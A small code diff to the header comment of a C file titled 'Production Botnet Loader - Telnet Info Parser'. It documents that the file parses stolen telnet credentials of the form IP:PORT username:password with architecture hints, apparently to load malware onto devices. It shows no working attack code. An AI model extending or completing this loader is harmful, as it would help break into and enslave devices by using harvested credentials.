@@ -1,6 +1,10 @@
 /*
  * Production Botnet Loader - Telnet Info Parser
- */
+ * ============================================================================
+ * Parses credential strings from stdin
+ * Format: IP:PORT username:password [architecture]
+ * Supports: CIDR notation, custom ports, architecture hints
+ * ============================================================================ */
 
 #include "includes.h"
 #include "telnet_info.h"
